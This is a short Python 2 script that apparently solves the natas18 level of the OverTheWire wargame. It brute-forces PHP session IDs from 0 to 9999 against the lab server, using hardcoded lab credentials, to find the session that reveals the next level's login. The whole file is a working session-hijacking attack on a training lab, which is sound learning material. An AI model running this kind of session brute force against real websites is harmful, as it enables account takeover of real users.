import requests
from requests.auth import HTTPBasicAuth

HOST = 'http://natas18.natas.labs.overthewire.org/index.php?debug=1'
auth = HTTPBasicAuth('natas18', 'xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP')

for i in range(10000):
    params = dict(debug=1)
    cookies = dict(PHPSESSID=str(i))
    r = requests.get(HOST, params=params, cookies=cookies, auth=auth)
    if 'Username: natas19' in r.content:
        print r.content
